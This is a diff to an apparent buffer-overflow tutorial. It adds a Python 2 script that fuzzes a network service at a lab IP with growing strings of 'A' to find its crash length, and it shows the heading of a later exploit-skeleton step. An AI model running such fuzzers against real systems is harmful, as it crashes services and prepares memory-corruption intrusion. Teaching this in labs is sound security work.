@@ -23,7 +23,7 @@ Example:
 
 #### Step 4: Fuzz the application; Note the length of string that is needed to crash the application
 
-Example Python Code for Fuzzing:
+Example Python3 Code for Fuzzing:
 
  ```
  #!/usr/bin/env python3
@@ -53,6 +53,34 @@ while True:
   string += 100 * "A"
   time.sleep(1)
   ```
+Example Python 2 Code for Fuzzing:
+```
+  import socket, time, sys
+
+ip = "10.9.0.78"
+port = 31337
+timeout = 5
+
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        print("Fuzzing with %s bytes" % len(string))
+        s.send(string + "\r\n")
+        data = s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
+```
   
 #### Step 5: Create exploit.py skeleton:
 *Most likley, the examples provided will have to be modified in some way since every program is different*
